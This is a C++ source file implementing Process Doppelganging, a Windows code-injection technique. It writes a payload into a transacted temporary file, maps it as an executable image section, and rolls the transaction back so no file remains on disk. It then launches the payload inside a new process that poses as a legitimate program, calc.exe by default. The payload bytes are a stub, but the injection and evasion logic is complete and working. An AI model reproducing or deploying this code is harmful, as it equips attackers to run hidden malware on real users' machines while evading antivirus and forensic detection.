#include <Windows.h>
#include <KtmW32.h>
#include <iostream>
#include <stdio.h>

// Include your required headers (adjust paths as needed)
#include "ntddk.h"
#include "ntdll_undoc.h"
#include "util.h"
#include "pe_hdrs_helper.h"
#include "process_env.h"

#pragma comment(lib, "KtmW32.lib")
#pragma comment(lib, "Ntdll.lib")

#define PAGE_SIZE 0x1000

// Function: Create a transacted section from payload bytes
HANDLE make_transacted_section(BYTE* payloadBuf, DWORD payloadSize)
{
    DWORD options = 0, isolationLvl = 0, isolationFlags = 0, timeout = 0;

    // Create a transaction
    HANDLE hTransaction = CreateTransaction(nullptr, nullptr, options, isolationLvl, isolationFlags, timeout, nullptr);
    if (hTransaction == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create transaction!" << std::endl;
        return INVALID_HANDLE_VALUE;
    }

    wchar_t dummy_name[MAX_PATH] = { 0 };
    wchar_t temp_path[MAX_PATH] = { 0 };
    GetTempPathW(MAX_PATH, temp_path);
    GetTempFileNameW(temp_path, L"TH", 0, dummy_name);

    // Create a transacted file for writing the payload bytes
    HANDLE hTransactedWriter = CreateFileTransactedW(dummy_name,
        GENERIC_WRITE,
        FILE_SHARE_READ,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL,
        hTransaction,
        NULL,
        NULL
    );
    if (hTransactedWriter == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create transacted file: " << GetLastError() << std::endl;
        return INVALID_HANDLE_VALUE;
    }

    DWORD writtenLen = 0;
    if (!WriteFile(hTransactedWriter, payloadBuf, payloadSize, &writtenLen, NULL)) {
        std::cerr << "Failed writing payload! Error: " << GetLastError() << std::endl;
        CloseHandle(hTransactedWriter);
        return INVALID_HANDLE_VALUE;
    }
    CloseHandle(hTransactedWriter);

    // Open the file for reading
    HANDLE hTransactedReader = CreateFileTransactedW(dummy_name,
        GENERIC_READ,
        FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL,
        hTransaction,
        NULL,
        NULL
    );
    if (hTransactedReader == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to open transacted file: " << GetLastError() << std::endl;
        return INVALID_HANDLE_VALUE;
    }

    // Create a section from the transacted file (payload in memory as an image)
    HANDLE hSection = nullptr;
    NTSTATUS status = NtCreateSection(&hSection,
        SECTION_MAP_EXECUTE,
        NULL,
        0,
        PAGE_READONLY,
        SEC_IMAGE,
        hTransactedReader
    );
    if (status != STATUS_SUCCESS) {
        std::cerr << "NtCreateSection failed: " << std::hex << status << std::endl;
        CloseHandle(hTransactedReader);
        return INVALID_HANDLE_VALUE;
    }
    CloseHandle(hTransactedReader);

    // Rollback the transaction so file changes are discarded while keeping the section live
    if (RollbackTransaction(hTransaction) == FALSE) {
        std::cerr << "RollbackTransaction failed: " << std::hex << GetLastError() << std::endl;
        CloseHandle(hTransaction);
        return INVALID_HANDLE_VALUE;
    }
    CloseHandle(hTransaction);

    return hSection;
}

// Function: Create the process via Doppelganging using the payload from memory
bool process_doppel(wchar_t* targetPath, BYTE* payloadBuf, DWORD payloadSize)
{
    HANDLE hSection = make_transacted_section(payloadBuf, payloadSize);
    if (!hSection || hSection == INVALID_HANDLE_VALUE) {
        return false;
    }
    
    HANDLE hProcess = nullptr;
    NTSTATUS status = NtCreateProcessEx(
        &hProcess,                 // Process handle
        PROCESS_ALL_ACCESS,        // Desired access
        NULL,                      // Object attributes
        NtCurrentProcess(),        // Parent process
        PS_INHERIT_HANDLES,        // Flags
        hSection,                  // Section handle (from our payload)
        NULL,                      // Debug port
        NULL,                      // Exception port
        FALSE                      // InJob
    );
    if (status != STATUS_SUCCESS) {
        std::cerr << "NtCreateProcessEx failed! Status: " << std::hex << status << std::endl;
        if (status == STATUS_IMAGE_MACHINE_TYPE_MISMATCH) {
            std::cerr << "[!] The payload has mismatching bitness!" << std::endl;
        }
        return false;
    }

    PROCESS_BASIC_INFORMATION pi = { 0 };
    DWORD ReturnLength = 0;
    status = NtQueryInformationProcess(
        hProcess,
        ProcessBasicInformation,
        &pi,
        sizeof(PROCESS_BASIC_INFORMATION),
        &ReturnLength
    );
    if (status != STATUS_SUCCESS) {
        std::cerr << "NtQueryInformationProcess failed: " << std::hex << status << std::endl;
        return false;
    }
    
    PEB peb_copy = { 0 };
    if (!buffer_remote_peb(hProcess, pi, peb_copy)) {
        return false;
    }
    
    ULONGLONG imageBase = (ULONGLONG)peb_copy.ImageBaseAddress;
#ifdef _DEBUG
    std::cout << "ImageBase address: " << std::hex << imageBase << std::endl;
#endif

    DWORD payload_ep = get_entry_point_rva(payloadBuf);
    ULONGLONG procEntry = payload_ep + imageBase;

    if (!setup_process_parameters(hProcess, pi, targetPath)) {
        std::cerr << "Parameters setup failed" << std::endl;
        return false;
    }
    
    std::cout << "[+] Process created! Pid = " << std::dec << GetProcessId(hProcess) << "\n";
#ifdef _DEBUG
    std::cerr << "EntryPoint at: " << std::hex << procEntry << std::endl;
#endif

    HANDLE hThread = NULL;
    status = NtCreateThreadEx(&hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        (LPTHREAD_START_ROUTINE)procEntry,
        NULL,
        FALSE,
        0,
        0,
        0,
        NULL
    );
    if (status != STATUS_SUCCESS) {
        std::cerr << "NtCreateThreadEx failed: " << std::hex << status << std::endl;
        return false;
    }
    return true;
}

int wmain(int argc, wchar_t* argv[])
{
#ifdef _WIN64
    const bool is32bit = false;
#else
    const bool is32bit = true;
#endif

    // Set target process path; if none passed, use a default (e.g., calc.exe)
    wchar_t defaultTarget[MAX_PATH] = { 0 };
    get_calc_path(defaultTarget, MAX_PATH, is32bit);
    wchar_t* targetPath = defaultTarget;
    if (argc >= 2) {
        targetPath = argv[1];
    }

    // Embed your payload as a byte array.
    BYTE payloadBuf[] =
    {
        0x4D, 0x5A, 0x90, 0x00, // 'MZ' header bytes ...
    };
    DWORD payloadSize = sizeof(payloadBuf);

    if (init_ntdll_func() == false) {
        return -1;
    }

    bool is_ok = process_doppel(targetPath, payloadBuf, payloadSize);
    if (is_ok) {
        std::cerr << "[+] Done!" << std::endl;
    }
    else {
        std::cerr << "[-] Failed!" << std::endl;
#ifdef _DEBUG
        system("pause");
#endif
        return -1;
    }

#ifdef _DEBUG
    system("pause");
#endif
    return 0;
}
